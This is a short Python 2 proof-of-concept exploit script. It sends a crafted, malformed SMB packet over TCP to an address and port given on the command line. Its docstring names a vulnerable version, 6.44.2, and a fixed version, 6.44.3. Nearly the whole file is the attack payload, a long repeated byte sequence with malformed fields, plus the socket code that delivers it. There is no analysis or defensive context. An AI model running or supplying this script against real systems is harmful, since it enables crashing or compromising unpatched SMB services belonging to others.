#!/usr/bin/env python
import sys
import socket


def poc_smb_1(host, port=445):
    """
    tested version: stable 6.44.2
    fixed version: 6.44.3
    """
    payload = '\x00\x00\x00\xee\xfeSMB\x0e\xf3\xa0\x80\xb6\xfe\xa0\x80\xbd\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff\x0e\xfe\xef\xbf\xbf\xff?\xe1\x9a\x80\x00\x01\x0e\xe2\x7f\x87\xf3\xa0\x81\xb7\xfe\x1b\x00\x00\x00\x00\xb7\xfe\x1b\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf3\xa0\x81\xb5\x00\x00\x00\x00\x00\x00\x00\x00$\xc0\x80\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xd1\xc5\x81\xc2\xec\x88\xf3\xa0\xa0\x80\xb1\xea\x11\x83\xce4\x17\xeb\xc5\x0c{p\x00\x00\x00\x04\x00\xe2\x80\x88\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x0e\xfe\xff\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\xd4\xfa\xbc^\xc5g\xf3\xa0\x81\xb7\x8a9\xeaP\xe6\xa0(\x13\xc7\xa9\xa9@\xf4\x1b\x0f\xc3\xe3\x98\x89\xc54\x1e\xb4134h\xea\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00\x01\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x05\x00\x1e\x00\x00\x00\x00\x001\x00340282366920938463463374607431778211447\x002\x00.\x001\x006\x008\x00.\x002\x000\x000\x00.\x001\x005\x002\x00'

    send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_socket.connect((host, port))
    send_socket.send(payload)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "Usage: python poc.py <ip> <port>"
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])
    poc_smb_1(host, port)
